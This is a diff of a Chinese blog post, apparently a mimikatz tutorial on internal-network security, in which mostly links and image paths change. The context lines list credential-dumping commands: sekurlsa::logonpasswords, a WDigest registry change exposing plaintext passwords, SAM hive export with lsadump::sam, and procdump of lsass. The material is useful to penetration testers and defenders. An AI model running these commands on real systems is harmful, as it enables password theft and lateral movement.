@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/mimikatz%E4%BD%BF%E7%94%A8.png">
 <meta property="article:published_time" content="2022-06-14T17:59:59.000Z">
-<meta property="article:modified_time" content="2022-06-15T05:38:57.476Z">
+<meta property="article:modified_time" content="2024-01-07T13:32:45.741Z">
 <meta property="article:author" content="iDea">
 <meta property="article:tag" content="内网安全">
 <meta property="article:tag" content="mimikatz">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/mimikatz%E4%BD%BF%E7%94%A8.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/mimikatz%E4%BD%BF%E7%94%A8.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -280,18 +280,19 @@
               <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p>
 <h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p><strong>- 获取本地账号密码</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提升权限</span><br>privilege::debug<br><br><span class="hljs-comment">#抓取密码</span><br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404131800192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p>
+<p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213207690.png" srcset="/img/loading.gif" lazyload alt="image-20240107213207690"><br>当目标为win10或者2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。<br>cmd修改注册表命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
 <p><strong>-  SAM表获取hash</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#导出SAM数据</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#使用mimikatz提取hash</span><br>lsadump::sam /sam:SAM /system:SYSTEM<br></code></pre></td></tr></table></figure>
 <p><strong>- Procdump+Mimikatz</strong><br>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404174413894.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213218444.png" srcset="/img/loading.gif" lazyload alt="image-20240107213218444"></p>
 <p>将lsass.dmp下载到本地后，然后执行mimikatz:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure>
 <p>为了方便复制与查看，可以输出到本地文件里面</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe  sekurlsa::logonPasswords full &gt; pssword.txt<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404181255285.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210404181332603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+<p><img src="/2022/06/15/mimikatz%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8/image-20240107213229371.png" srcset="/img/loading.gif" lazyload alt="image-20240107213229371"></p>
 <ul>
 <li><strong>读取域控中域成员Hash</strong><br>域控以上域管理员身份执行mimikatz</li>
 </ul>
@@ -337,7 +338,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
   
   
 
@@ -352,9 +353,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
       
-        <a href="/tags/mimikatz/">#mimikatz</a>
+        <a href="../../../../../tags/mimikatz/">#mimikatz</a>
       
     </div>
   
@@ -409,7 +410,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">
+                      <a href="../../%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网信息收集">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">内网信息收集</span>
                         <span class="visible-mobile">上一篇</span>
@@ -419,7 +420,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/" title="backdoor-factory工具使用">
+                      <a href="../../backdoor-factory%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/backdoor-factor/" title="backdoor-factory工具使用">
                         <span class="hidden-mobile">backdoor-factory工具使用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -573,8 +574,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -613,7 +614,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -750,7 +751,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -758,7 +759,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
